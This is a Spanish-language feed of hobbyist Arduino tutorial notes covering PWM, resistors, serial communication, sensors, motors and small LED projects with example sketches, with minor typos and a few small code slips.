Copy<br>Para comenzar a programar y realizar acciones con nuestra placa es muy importante tener a mano el manual con la <a data-tooltip-position="top" aria-label="https://docs.arduino.cc/resources/pinouts/A000066-full-pinout.pdf" rel="noopener nofollow" class="external-link" href="https://docs.arduino.cc/resources/pinouts/A000066-full-pinout.pdf" target="_blank">asignación de pines</a> realizada por Arduino.<br><br>La Modulación por Ancho de Pulso (PWM) o Pulse Width Modulation es una técninca utilizada para controlar la cantidad de energía entregada a un dispositivo electrónico mediante la variación del ancho de un pulso de señal digitial. La principal aplicación de PWM es controlar la potencia entregada a dispositivos que no pueden funcionar a plena potencia todo el tiempo, como motores, LEDs o válvulas solenoides. AL variar e lciclo de trabajo de la señal PWM, podemos variar la cantidad de potencia entregada aal dispositivo y, por lo tanto, su velocidad, birllo o posición.<br>En el caso de Arduino y otros microcontroladores, los pines designados como PWM son capaces de generar señales PWM mediante hardware, lo que facilita su uso para controlar dispostivios analógicos con una alta presición y eficiencia. Los pintes PWM en Arduino contienen un ~ delante del número.<br><br>Estas son funciones con el mismo proposito en el manejo de Arduino pero con unas diferencias importantes a tener en cuenta.<br>
<br>digitalWrite: 

<br>Esta función se utiliza para controlar los pines digitales del Arduino.
<br>Solo puede emitir dos niveles de voltaje: 0 voltios (LOW) o 5 voltios (HIGH).
<br>Es útil para encender o apagar componentes que solo necesitan dos estados, como LEDs o relés.


<br>analogWrite:

<br>A diferencia de digitalWrite, esta se utiliza para controalr pines PWM del Arduino.
<br>PWM no genera realmente un señal analógica, sino que simula una señal analógica mediante la rápida conmutación entre dos estados: encendido y apagado. En caso de querer tener una señal analógica real en lugar de una simulada deberiamos hacer uso de un DAC.
<br>Permite controlar la cantidad de tiempo que el pin está en estado "encendido" (HIGH) duante cada ciclo de PWM.
<br>El segundo parámetro de esta función acepta valores entre 0 y 255, lo que corresponde al ciclo de trabajo de PWM.
<br>El valor de 0 significa que el pin está siempre apagado (0% del ciclo de trabajo), mientras que un valor de 255 significa que el pin está siempre encendido (100% del ciclo de trabajo).
<br>Los valores intermedios entre 0 y 255 ajustan la proporción de tiempo que el pin está encendido en cada ciclo, lo que permite controlar la cantidad de voltaje promedio entregado al dispositivo conectado al pin.
<br>Es útil para controlar la intensidad luminosa de LEDs, la velocidad de motores DC, entre otros dispositivos que puede ser controaldos con señal PWM.


<br><br><br>Las resistencias son componentes fundamentales en la electrónica. Se utilizan para limitar la corriente, dividir el voltaje, establecer niveles de referencia y realizar muchas otras funciones en los circuitos eléctricos. <br>Los valores de las resistencias (como 220 ohmios, 1K ohmios, 5K ohmios, 10K ohmios, etc) representan su resistencia eléctrica en ohmios.<br>Por ejemplo, en un simple circuito donde poseemos una fuente de 5v conectada a un cable jumper y este a una resistencia de 220 ohmios a su vez conectada a tierra, podemos hacer uso de la Ley de Ohm descrita en la sección de <a data-href="Electronic" href="https://dobliuw.com/notes/6.-hardware/arduino/elelctronic/electronic.html" class="internal-link" target="_self" rel="noopener nofollow">Electronic</a> para determinar la corriente.<br>I = V / R<br>
I = 5V / 220Ω<br>
I = 0.02A<br>V = I * R<br>
V = 0.02A * 220 Ω<br>
V = 4,4V<br>Entonces, dados estos cálculos, después de la resistencia, la tensión medida sería 5V - 4,4V = 0,6V. <br><img alt="resistors_electronic.png" src="https://dobliuw.com/lib/media/resistors_electronic.png" style="width: 700px; max-width: 100%;"><br><br><br>Los baurd rates o baudios son una medida de la velocidad de transmisión de datos en una comunicación serie. Se refieren a la cantidad de símbolos (bits) que podrían llegar a ser tranmisitidos por segundo a través de un canal de comunicación, pero esto no quiere decir que necesariamente estos sean tranmisitidos.<br>
La cantidad de baud rates indicados en funciones como Serial.begin() esta relacionado a la capacidad de intercambio de datos que se quiere tener respecto de un dispositivo, y los valores más comunes que se suele ver son 9600, 115.200, 576.000, etc.<br><br><br>La comunicación serial es un método de transferencia de datos en el que los bits de datos se ecnvián secuencialmente uno tras otro a través de un único canal de comunicación. En arduino, la comuinicación serial se utiliza para enviar y recibir datos entre la placa Arduino y otros dispositivos, como sensores, actuadores o un ordenador.<br>La comunicación serial en Arduino es realizada a través de los pines digitales, específicamente los pines RX (Recepción) y TX (Transmisión) y hacer uso de este tipo de comunicación requerira el uso de una clase llamada Serial la cual haciedno uso de métodos nos proporcionara una interfaz para comunicarnos a través del puerto serie (UART) de la placa. <br>Esta clase incluye métodos para configurar la comunicación serial, enviar y recebier datos, y realizar otras operaciones relacionadas con la comunicación serial, por ejemplo:<br>
<br>.begin(baudRate): Inicia la comunicación serial con el baud rate especificado.
<br>.print(data): Envía datos al puerto serie en forma de caracteres ASCII.
<br>.println(data): Envía datos al puerto serie seguidos de un salto de línea.
<br>.available(): Devuelve el número de bytes disponibles para leer en el búfer de recepción.
<br>.read(): Lee el siguiente byte de datos del búfer de recepción.
<br>.write(data): Evnía un byte de datos al puerto serie. 
<br><br><br>Un buzzer como sabemos es un dispositivo electromecánico que porduce un sonido cuando se le aplica una corriente eléctrica. Consiste en un oscilador electromagnético que genera vibraciones audibles cuando se activa. <br>Los buzzers se utilizan en una variedad de aplicaciones, tanto en proyectos electrónicos como en dispositivos de uso cotidiano, por ejemplo:<br>
<br>Señales de advertencia.
<br>Indicadores de estado.
<br>Señales de retroalimentación.
<br>Para hacer uso de estos dispositivos podemos hacer uso de la función tone() o simplemente emitir una señal de 5V y alterar el tiempo entre que se emite esta señal, se deja de emitir y se vuelve a realizar esta acción en bucle según cuando sea necesaria, para esto hay que tener en cuenta que existen distintos tipos de buzzers como los activos, pasivos y estos varian la capacidad de tonos que puede alcanzar. <br><img alt="buzzers_electronic.png" src="https://dobliuw.com/lib/media/buzzers_electronic.png"><br><br><br>Un sensor de luz, también conocido como fotodetector o fotocélula, es un dispositivo que detecta la intensidad de la luz en su entorno y convierte esta finformación en una señal eléctrica proporcional. Estos sensores son comunes en una variedad de aplicaciones y se utilizan para automatizar sistemas de iluminación, controlar la exposición en cámaras fotográficas, medir la luz ambiental en dispostivos electrónicos y mucho más. <br>La mayoria de estos, cuando la luz es muy alta, la resistencia aumenta dando por consecuencia una menor cantidad de voltaje y ocacionando la inverso cuando la luz se apaga o se reduce.<br><img alt="photoresistor_electronic.png" src="https://dobliuw.com/lib/media/photoresistor_electronic.png" style="width: 600px; max-width: 100%;"><br><br><br>Un pushbutton, o botón pulsador, es un componente electromecánico simple que se utiliza para arbrir o cerrar un circuito eléctrico temporalmente cuando se presional. Consiste en un botón que se presiona para establecer una conexión eléctrica y se suelta para romper esa conexión.<br>El botón pulsador típicamente tiene dos terminales o pines, uno conectado a una línea de voltaje (VCC) y otro conectado a una línea de tierra (GND) o a un pin de entrada/salida de un microcontrolador. Cuando se utiliza el botón pulsador con un microcontrolador, es común utilizar resistencias de pull-up o pull-down para garantizar un funcionamiento correcot y estable del circuito.<br><img alt="pushbutton_electronic.png" src="https://dobliuw.com/lib/media/pushbutton_electronic.png"><br><br>Se coloca una resistencia entre la línea de voltaje (VCC) y el pin del botón pulsador que se conecta al microcontrolador. Esto asegura que el pin del microcontrolador esté en un estado lógico alto (HIGH) cunado el botón no está presionado. Cuando se presiona el botón, se cierra el circuito y el pin del microcontrolador se conecta a tierra (GND), estableciendo un estado lógico bajo (LOW). <br><img alt="pull_up_resistor_electronic.png" src="https://dobliuw.com/lib/media/pull_up_resistor_electronic.png" style="width: 1200px; max-width: 100%;"><br><br>Se coloca una resistencia entre el pin del botón pulsador y la línea de tierra (GND). Esto asegura que el pin del microcontrolador esté en un estado lógico bajo (LOW) cuando el botón no está presionado. Cuando se presiona el botón, se cierra el circuito y el pin del microcontrolador se conecta a la línea de voltaje (VCC), estableciendo un estado lógica alto (HIGH).<br><img alt="pull_down_resistor_electronic.png" src="https://dobliuw.com/lib/media/pull_down_resistor_electronic.png" style="width: 1200px; max-width: 100%;"><br><br>Existe una manera de llevar a cabo el uso de pushbuttons sin el uso de pull-up resistors o pull-down resistors, de esta manera simplemente deberíamos conectar el boton a un voltaje de 5V y a tierra (GND) mediante las "patitas" opuestas del boton y brindarle en la configuración que se realiza una vez (función setup) un digitalWrite para emitir 5V (HIGH) al boton, de manera que su estado default pasará a ser 1 y trás ser presionado mutará a 0.<br>int buttonPin = 2;

void setup(){
	pinMode(buttonPin, INPUT);
	digitalWrite(buttonPin, HIGH);
}
Copy<br><img alt="button_without_resistors_electronic.png" src="https://dobliuw.com/lib/media/button_without_resistors_electronic.png" style="width: 1200px; max-width: 100%;"><br><br><br>Un servomotor es un dispositivo electromecánico que puede girar o moverse hacia una posición específica en respuesta a una señal de control. <br><img alt="servomotor_electronic 1.png" src="https://dobliuw.com/lib/media/servomotor_electronic-1.png"><br>Para hacer uso de estos desde la IDE de Arduino, podríamos importar la librería Servo.h con #include &lt;Servo.h&gt; y comenzar a hacer uso y control de este.<br>#include &lt;Servo.h&gt;
int servoPin = 8;

Servo servoVariableName

void setup(){
	servoVariableName.attach(servoPin); 
}

void loop(){
	servoVariableName.write(50); // Turn into a specific angle
}
Copy<br><br><br>Un motor paso a paso o setpper motor, es otro tipo de motor utilizado en aplicaciones que requiere precisión en el movimiento, pero su funcionamiento es diferente al de un servomotor. En un motor paso a paso, el movimiento se profuce mediante al secuencia de pasos discretos, cada uno de lso caules mueve el eje del motor una pequeña cantidad angular. Este tipo de motor convierte los impusos eléctricos en movimientos mecánicos discretos y controlados.<br>Estos motores suelen ser conectados y controlados mediante un módulo de control específico diseñado para manejar las señales de control necesarias para impulsar el motor de manera adecuada.<br>En esta explicación haremos uso del motor: 28BYJ-48 y de su modulo controlador de motor paso a paso SBT0811<br>Modulo controlador SBT0811:<br>
<img alt="stepper_motor_handle_module_SBT0811.png" src="https://dobliuw.com/lib/media/stepper_motor_handle_module_sbt0811.png"><br>Stepper motor 28BYJ-48:<br>
<img alt="stpper_motor_28BYJ-48.png" src="https://dobliuw.com/lib/media/stpper_motor_28byj-48.png"><br>Para hacer uso de estos motores desde la IDE de Arduino, hay algunas cosas que debemos tener en cuenta. La primera es que cada motor tiene su especificación en particular relacionada a los pasos por revolución utilizados por este, o si el motor posee especificaciones particulares sobre a que pines conectar cada uno de los pines salientes del modulo controlador del motor, etc.<br>En este caso haremos uso de esta <a data-tooltip-position="top" aria-label="https://lastminuteengineers.com/28byj48-stepper-motor-arduino-tutorial/" rel="noopener nofollow" class="external-link" href="https://lastminuteengineers.com/28byj48-stepper-motor-arduino-tutorial/" target="_blank">guía</a> que encontramos tras una simple busqueda del modelo del motor.<br>A su vez, para hacer uso de este tipo de motores, necesitaremos instalar e importar la libreria Stepper.h para poder manejar al mismo, similar a los servomotores:<br>#include &lt;Stepper.h&gt;
int setpsPerRevolution = 2038;

# Declare ous stepper motor
Stepper MyFirstStepper = Stepper(setpsPerRevolution, 8, 10, 9, 11);

# Increment the speed
MyFirstStepper.setSpeed(10);

# Insert a number to make setps (2038 = One round)
MyDirstStepper.step(2038);
Copy<br>Tras la declaración de nuestr motor en la cuarta línea, despues de pasarle a la función Stepper los steps por segundo (Encontrados en la guía), le pasamos la suceción de pines 8, 10, 9, 11. Primero, estos pines corresponden a los pines que serán utilizados por el motor y que la guía nos indica según el modelo controlador del motor.<br><img alt="pinout_module_handler_setpper_motor.png" src="https://dobliuw.com/lib/media/pinout_module_handler_setpper_motor.png"><br><img alt="pins_sequence_sepper_motor.png" src="https://dobliuw.com/lib/media/pins_sequence_sepper_motor.png" style="width: 900px; max-width: 100%;"><br><br><br>Los tilt swtiches o interruptores de inclinación, son dispositivos electrónicos que se activan o desactiva cuando se inclinan a una cierta posición. Consiste en un pequeño contacto metálico que se meuve dentro de una carcasa cuando e linterruptor se inclina en una drección específica.<br><img alt="tilt_swtich_electronic.png" src="https://dobliuw.com/lib/media/tilt_swtich_electronic.png"><br><br><br>Los motores DC (Direct Current), o motores de corriente continua son dispositivos electromecánicos que convierten la energía eléctrica en energía mecánica.<br>
Los motores de corriente continua suelen utilizarse con un componente electrónico el cual es un circuito integrado diseñado específicamente para controlar motores DC. Por ejemplo el L293D es un controlador especializado que permite controlar la dirección de giro del motor (Hacia adelante o hacia atrás) y la velocidad del motor mediante señales análogicas. <br>
<br>
Ejemplo de motor DC:<br>
<img alt="dc_motor_example_electronic.png" src="https://dobliuw.com/lib/media/dc_motor_example_electronic.png" style="width: 300px; max-width: 100%;">

<br>
Ejemplo de circuito intrgrado (<a data-tooltip-position="top" aria-label="https://laelectronica.com.gt/extras/que-es-y-como-funciona-un-l293d" rel="noopener nofollow" class="external-link" href="https://laelectronica.com.gt/extras/que-es-y-como-funciona-un-l293d" target="_blank">L293D</a>):<br>
<img alt="l293d_electronic.png" src="https://dobliuw.com/lib/media/l293d_electronic.png" style="width: 300px; max-width: 100%;">

<br>Para hacer uso del mismo simplemente deberíamos seguir el diseño de esta imagen en donde nos indica donde se encuentra el GND, los 5V que hay que darle a el circuito integrado, donde se conectan los cables del motor, donde se recibe la señal análoga para el control de la velocidad junto a los pines relacionados a la dirección para controlar las dos posibles direcciones. <br><img alt="l293d_usage.png" src="https://dobliuw.com/lib/media/l293d_usage.png">]]></description><link>https://dobliuw.com/notes/6.-hardware/arduino/arduino-proyects/0.-initial-programs-and-basic.html</link><guid isPermaLink="false">Notes/6. Hardware/Arduino/Arduino Proyects/0. Initial programs and Basic.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 19 Jul 2024 20:18:43 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/resistors_electronic.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/resistors_electronic.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Componentes necesarios]]></title><description><![CDATA[ 
 <br><br>
<br>Arduino (Cualquier modelo compatible).
<br>LEDs (Light Emitting Diodes), en este caso haremos uso de 3 leds, uno rojo, verde y amarillo.
<br>Resistencias, en este caso haremos uso de 3 resistencias de 330 o 220 
<br><br><br>Para llevar a cabo el uso de LEDs en proyectos de electrónica es importante tener en cuenta ciertas cuestiones.<br>
1. El cátodo, terminal negativo de un dispositivo electrónico, es la "patita corta".<br>
2. El ánodo, terminal positivo de un dispositivo eletrónico, es la "patita larga".<br>
3. Los LEDs típicamente tiene un voltaje de funcionamiento directo específico, por ejemplo, 2.0-2.5 voltios, lo que significa que al menos se deberá suministrar este voltaje para que el mismo se ilumine. <br><br>Arduino sumistra una salida de 5 voltios en los pines, lo que significa que en caso de conectar un pin al ánodo de un led mediante un cable jumper correremos el riesgo de que el mismo se queme. Para esto haremos uso de una resistencia la cual se utiliza para limitar la corriente que pasa a través del mismo. <br>
<br>El valor de la resistencia se puede calcular utilizando la ley Ohm (R = (Vcc - Vled) / I), donde Vcc es el voltaje de alimentación de arduino (5V), Vled es el voltaje de funcionamiento directo del LED, e &lt;i es la corriente máxima que el LED puede manejar (Generalmente se encuenta en las especificaciones del LED).
<br><br><br>Es importante destacar el uso de dos funciones utilizadas:<br>
<br>pinMode(pin, mode): Función que configura el pin especificado como argumento como entrada o salida (INPUT / OUTPUT).
<br>digitalWrite(pin, value): Función que establece el estado de un pin digital como HIGH o LOW (Encendido o apagado).
<br>delay(ms): Función que pausa la ejecución del programa durante el número especificado de milisegundos.
<br>int green_led = 2;
int yellow_led = 3;
int red_led = 4;

void makeBlink(int pin, int time_on, int time_off){
  digitalWrite(pin, HIGH);
  delay(time_on);
  digitalWrite(pin, LOW);
  delay(time_off);
}

void setup() {
  // put your setup code here, to run once:
  pinMode(green_led, OUTPUT);
  pinMode(yellow_led, OUTPUT);
  pinMode(red_led, OUTPUT);
}

void loop() {
  // put your main code here, to run repeatedly:
  makeBlink(red_led, 6000, 0);
  makeBlink(yellow_led, 2000, 1000);
  makeBlink(green_led, 6000, 0);
}
Copy<br><br><br>Se conectaron 3 cables jumpers a los pin 2, 3 y 4 del arduino a distintos huecos de la breadboard, posteriormente se conecto un extremo de la resistencia (Una patita) a cada extremo de estos cables y el otro extremo (La otra patita) al ánodo (Patita larga) de cada uno de los LEDs y cada cátodo (Patita corta) de cada uno de los LEDs conectados a un mismo flujo de corriente enlazada a un cable jumper directo al pin GND (Tierra) para indicar el cierre del circuito.<br>Diagrama de circuito de conexión de un led:<br>
<img alt="led_connection_electronic.png" src="https://dobliuw.com/lib/media/led_connection_electronic.png"><br>Imagénes del circuito:<br>
<img alt="semaforo_arduino_1.png" src="https://dobliuw.com/lib/media/semaforo_arduino_1.png" style="width: 600px; max-width: 100%;"><img alt="semaforo_arduino_2.png" src="https://dobliuw.com/lib/media/semaforo_arduino_2.png" style="width: 600px; max-width: 100%;">]]></description><link>https://dobliuw.com/notes/6.-hardware/arduino/arduino-proyects/1.-semaforo.html</link><guid isPermaLink="false">Notes/6. Hardware/Arduino/Arduino Proyects/1. Semaforo.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 26 Apr 2024 04:12:05 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/led_connection_electronic.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/led_connection_electronic.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Componentes necesarios]]></title><description><![CDATA[ 
 <br><br>
<br>Arduino (Cualquier modelo compatible).
<br>LEDs (Light Emitting Diodes), en este caso haremos uso de 4 leds del mismo color.
<br>Resistencias, en este caso haremos uso de 4 resistencias de 330 o 220 
<br><br><br>Para llevar a cabo el uso de LEDs en proyectos de electrónica es importante tener en cuenta ciertas cuestiones.<br>
1. El cátodo, terminal negativo de un dispositivo electrónico, es la "patita corta".<br>
2. El ánodo, terminal positivo de un dispositivo eletrónico, es la "patita larga".<br>
3. Los LEDs típicamente tiene un voltaje de funcionamiento directo específico, por ejemplo, 2.0-2.5 voltios, lo que significa que al menos se deberá suministrar este voltaje para que el mismo se ilumine. <br><br>Arduino sumistra una salida de 5 voltios en los pines, lo que significa que en caso de conectar un pin al ánodo de un led mediante un cable jumper correremos el riesgo de que el mismo se queme. Para esto haremos uso de una resistencia la cual se utiliza para limitar la corriente que pasa a través del mismo. <br>
<br>El valor de la resistencia se puede calcular utilizando la ley Ohm (R = (Vcc - Vled) / I), donde Vcc es el voltaje de alimentación de arduino (5V), Vled es el voltaje de funcionamiento directo del LED, e &lt;i es la corriente máxima que el LED puede manejar (Generalmente se encuenta en las especificaciones del LED).
<br><br><br>Es importante destacar el uso de dos funciones utilizadas:<br>
<br>pinMode(pin, mode): Función que configura el pin especificado como argumento como entrada o salida (INPUT / OUTPUT).
<br>digitalWrite(pin, value): Función que establece el estado de un pin digital como HIGH o LOW (Encendido o apagado).
<br>delay(ms): Función que pausa la ejecución del programa durante el número especificado de milisegundos.
<br>#include &lt;stdio.h&gt;

int led1 = 5;
int led2 = 4;
int led3 = 3;
int led4 = 2;

char* convertToBinary(int digit){
  static char binary_number[5];
  for(int bit_counter = 3; bit_counter &gt;= 0; bit_counter--){
    int binary = digit &gt;&gt; bit_counter &amp; 1;
    binary_number[3 - bit_counter] = binary + '0';
  };
  return binary_number;
}

void representBinaryLEDS(int bit, int pin){
  switch(pin){
      case 0:
        digitalWrite(led1, bit ? HIGH : LOW);
        break;
      case 1:
        digitalWrite(led2, bit ? HIGH : LOW);
        break;
      case 2:
        digitalWrite(led3, bit ? HIGH : LOW);
        break;
      case 3:
        digitalWrite(led4, bit ? HIGH : LOW);
        break;
      default:
        break;
  }
}

void setup() {
  // put your setup code here, to run once:
  pinMode(led1, OUTPUT);
  pinMode(led2, OUTPUT);
  pinMode(led3, OUTPUT);
  pinMode(led4, OUTPUT);
};

void loop() {
  // put your main code here, to run repeatedly:
  int digits[4];
  for(int i = 0; i &lt; 16; i++){
    char* binary = convertToBinary(i);
    for(int j = 3; j &gt;= 0; j--){
      digits[j] = binary[j] - '0'; // To convert the char '0' or '1' to the integer value
    }
    representBinaryLEDS(digits[0], 0);
    representBinaryLEDS(digits[1], 1);
    representBinaryLEDS(digits[2], 2);
    representBinaryLEDS(digits[3], 3);
    delay(1000);
  }
}
Copy<br>Algunos aspectos a tener en cuenta sobre la funcionalidad de C utilizadas en este código son:<br>Operador de desplazamiento a la derecha (&gt;&gt;): Este operador se utiliza para desplazar los bits de un número hacia la derecha en una cantidad especificada.<br>
Operador AND (&amp;): Este operador realiza una operación lógica AND a nivel de bits entre dos operadores. <br>
<br>Ejemplo: El número 1 se representa en binario como 0001, al realizar 1 &gt;&gt; 2 &amp; 1, se está aplicando un AND bit a bit entre el resultado del desplazamiento y 0001. Esto dará como resultado 1 si el bit más a la derecha del número desplazado es 1 y 0 si es 0.  Para entenderlo de una mejor manera es como si se desplazará bit a bit desde izquierda a derecha para aplicarle un AND y obtener su valor.
<br>
<br>
PoC con for(int i = 3; i &gt;= 0; i--){ 5 &gt;&gt; i &amp; 1}

<br>
5 &gt;&gt; 3 &amp; 1:

<br>
Comenzamos con el número binario 0101.

<br>
Desplazamos el bit más a la derecha (1) tres posiciones, lo que resulta en 0000:

<br>Número original (5): 0101.
<br>1er paso: 0010.
<br>2do paso: 0001.
<br>3er paso: 0000.


<br>
Aplicamos un AND bit a bit con 1, lo que resulta en 0.  

<br>0000 AND 0001:
<br>0 &amp; 1 = 0
<br>0 &amp; 0 = 0
<br>0 &amp; 0 = 0 
<br>0 &amp; 0 = 0
<br>Resultado = 0000 = 0


<br>
5 &gt;&gt; 2 &amp; 1:

<br>
Comenzamos con el número binario 0101.

<br>
Desplazamos el bit más a la dercha (1) dos posiciones, lo que resulta en 0001:

<br>Número orignal (5): 0101.
<br>1er paso: 0010.
<br>2do paso: 0001.


<br>
Aplicamos un AND bit a bit con 1, lo que resulta en 1.

<br>0001 AND 0001:
<br>1 &amp; 1 = 1
<br>0 &amp; 0 = 0
<br>0 &amp; 0 = 0 
<br>0 &amp; 0 = 0
<br>Resultado = 0001 = 1


<br>
5 &gt;&gt; 1 &amp; 1:

<br>
Comenzamos con el número binario 0101.

<br>
Desplazamos el bit más a la dercha (1) una posición, lo que resulta en 0010:

<br>Número orignal (5): 0101.
<br>1er paso: 0010.


<br>
Aplicamos un AND bit a bit con 1, lo que resulta en 0.

<br>0010 AND 0001:
<br>0 &amp; 1 = 0
<br>1 &amp; 0 = 0
<br>0 &amp; 0 = 0 
<br>0 &amp; 0 = 0
<br>Resultado = 0000 = 0


<br>
5 &gt;&gt; 0 &amp; 1:

<br>
Comenzamos y finalizamos con el número binario 0101.

<br>
Aplicamos un AND bit a bit con 1, lo que resulta en 1.

<br>0101 AND 0001:
<br>1 &amp; 1 = 1
<br>0 &amp; 0 = 0
<br>1 &amp; 0 = 0 
<br>0 &amp; 0 = 0
<br>Resultado = 0001 = 1




<br>Convertir int a string y string a int (+ '0' y - 0):  Para convertir un entero a una cadena de caracteres en C, puedes usar la técnica de sumar el valor entero con el valor ASCII del carácter '0'. En la tabla ASCII, los dígitos del 0 al 9 están representados consecutivamente desde el valor 48 ('0') hasta el valor 57 ('9'). Al sumar el valor entero con el valor ASCII del carácter '0', obtendrás el carácter correspondiente al dígito del entero. Esto funciona porque los valores ASCII están ordenados de manera que el carácter '0' está justo antes de los dígitos del 0 al 9.<br>
<img alt="acii_table.png" src="https://dobliuw.com/lib/media/acii_table.png"><br>
Ejemplo: 5 en digito se suma al '0' caracter, tomando el valor de 48, sumandole 5 dando como resultado 53 siendo este representado en ASCII ('5').<br><br><br>Se conectaron 4 cables jumpers a los pin 2, 3, 4 y 5 del arduino a distintos huecos de la breadboard, posteriormente se conecto un extremo de la resistencia (Una patita) a cada extremo de estos cables y el otro extremo (La otra patita) al ánodo (Patita larga) de cada uno de los LEDs y cada cátodo (Patita corta) de cada uno de los LEDs conectados a un mismo flujo de corriente enlazada a un cable jumper directo al pin GND (Tierra) para indicar el cierre del circuito.<br>Imagen del circuito:<br>
<img alt="binary_counter_arduino.png" src="https://dobliuw.com/lib/media/binary_counter_arduino.png">]]></description><link>https://dobliuw.com/notes/6.-hardware/arduino/arduino-proyects/2.-contador-binario.html</link><guid isPermaLink="false">Notes/6. Hardware/Arduino/Arduino Proyects/2. Contador binario.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Sat, 27 Apr 2024 03:07:43 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/acii_table.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/acii_table.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Componentes necesarios]]></title><description><![CDATA[ 
 <br><br>
<br>Arduino (Cualquier modelo compatible).
<br>LEDs (Light Emitting Diodes), en este caso haremos uso de 1 led rojo.
<br>Resistencia, en este caso haremos uso de 1 resistencia de 330 o 220 ohmios.
<br>Cables jumpers, en este caso puede variar la cantidad de cables a utilizar dependiendo del cuidado al llevar a cabo el circuito.
<br>Potenciometro de B10k.
<br><br><br>Un potenciómetro, también conocido como potenciómetro variable o resistencia variable es un dispositivo que proporciona ressitencia eléctrica variable en un circuito. Se utiliza comúnmente para controlar el voltaje, la corriente o el brillo en circuitos electrónicos.<br><br><br>Es importante destacar el uso de ciertas funciones utilizadas:<br>
<br>pinMode(pin, mode): Como ya sabemos, se trata de una función que configura el pin especificado como argumento como entrada o salida (INPUT / OUTPUT).
<br>digitalWrite(pin, value): Función que establece el estado de un pin digital como HIGH o LOW (Encendido o apagado).
<br>analogWrite(pin, value): Función que establece el estado de un pin digital con valores del 0 al 255 indicando el porcentaje de Voltios que se tranmistira, esta función simula un voltaje análogico.
<br>delay(ms): Función que pausa la ejecución del programa durante el número especificado de milisegundos.
<br>analogRead(pinA0-A5): Función que nos permite hacer lectura de valores interceptados con cable/s conectados a los pines ANALOG IN en la placa Arduino, los cuales nos permitiran leer valores análogos.
<br>Serial: Serial es una clase que nos permitira hacer uso de múltiples métodos para establecer una comunicación serial con la placa, lo que nos permitira representar datos en tiempo real entre otras funciones
<br>int readPin1 = A1;
int redLedPin = 3;
float voltage, analogSig;

void setup() {
  // put your setup code here, to run once:
  pinMode(readPin1, INPUT);
  pinMode(redLedPin, OUTPUT);
  Serial.begin(9600);
}

void loop() {
  // put your main code here, to run repeatedly:
  voltage = (5./1023.) * analogRead(readPin1);
  analogSig = (255./1023.) * analogRead(readPin1);
  Serial.print("[+] The voltage captured is: ");
  Serial.println(voltage);
  analogWrite(redLedPin, analogSig);
}
Copy<br>En este caso como podemos ver en el código y veremos en la configuración eléctronica, contamos con un pin (El ~3, aquellos que tengan el ~ delante del número de pin serán aquellos que puedan simular corrientes análogas) el cual se encarga de transmitir un valor del 0 al 255 a la resistencia y está al LED, dicho rango de valores es recibido por la función analogRead haciendo uso del cable conectado al pin A1 que se encuentra a la salida de la patita del medio del potenciador (Patita por la cual fluye el voltaje previamente alterado por el potenciador).<br><br><br>Se establece en la bread board una fila con un cable jumper conectado al pin GND para generar que dicha fila se transforme en tierra para que tanto el led con su cátodo (Patita corta) y uno de los extremos del potenciometro. Por otro lado, al otro extremo del potenciómetro se conecta un cable jumper que proviene del pin de 5V mientras que en la sálida del potenciometro (Patita del medio) se conecta un cable jumper que conecta con el pin A1 hayado en la sección ANALOG IN que utilizaremos para leer el voltaje proporcionado por el potenciómetro, donde por último, tendremos un cable jumper conectado al pin ~3 el cual se encargara de replicar análogicamente el valor proporcionado por el potenciometro.<br>Imagénes del circuito:<br>
<img alt="potenciometor_led_electronic.png" src="https://dobliuw.com/lib/media/potenciometor_led_electronic.png" style="width: 600px; max-width: 100%;"><img alt="potenciometor_led_electronic_2.png" src="https://dobliuw.com/lib/media/potenciometor_led_electronic_2.png" style="width: 600px; max-width: 100%;">]]></description><link>https://dobliuw.com/notes/6.-hardware/arduino/arduino-proyects/3.-potenciometro-con-señal-análogica-a-led.html</link><guid isPermaLink="false">Notes/6. Hardware/Arduino/Arduino Proyects/3. Potenciometro con señal análogica a LED.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 09 May 2024 02:33:07 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/potenciometor_led_electronic.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/potenciometor_led_electronic.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Componentes necesarios]]></title><description><![CDATA[ 
 <br><br>
<br>Arduino (Cualquier modelo compatible).
<br>Servomotor.
<br>Resistencia, en este caso haremos uso de 1 resistencia de 5K ohmios.
<br>Cables jumpers, en este caso puede variar la cantidad de cables a utilizar dependiendo del cuidado al llevar a cabo en el circuito.
<br>Photoresistor.
<br><br><br>El proyecto consiste en un sensor de luminosidad que hace uso de un servomotor como "flecha" para señalar cuando la luz esta prendida en su máxima capacidad y cuando esta oscuresidad en su minima capacidad.<br>Para llevar a cabo este proyecto, es necesario capturar los valores minimos y máximos transmitidos por el photoresistor a la hora de tener todas las luces prendidas y a su vez todas las luces apagadas del lugar en el que estemos.<br>Una vez realizado esto, podría darnos un valor similar a que cuando todas las luces estan apagadas, el valor es 150 y cuando todas las luces estan prendidas, el valor es 780.<br>Ahora, a esto se le suma que hay que tener en cuenta que en el servomotor utilizado, los grados posibles varian desde el 0 al 160. Por lo que para poder calcular y dejar funcionando la ídea de este programa, es necesario hacer uso de matématicas.<br>La fórmula a utilizar será:<br>m = y2 - y1 / x2 - x1<br>Esta fórumula se utiliza para calcular la pendiente (m) de una recta que pasa a través de dos puntos en un plano cartesiano. En este caso los dos puntos serían el máximo brillo de la luz junto al mínimo brillo de la luz.<br>Teniendo en cuenta esto, podemos entender que y correspondería al ángulo del servomotor, mientras que x correspondería al válor capturado por el photoresistor. Dejando como coordenadas (x1, y1) y (x2, y2) los siguientes valores:<br>(x1, y1) = 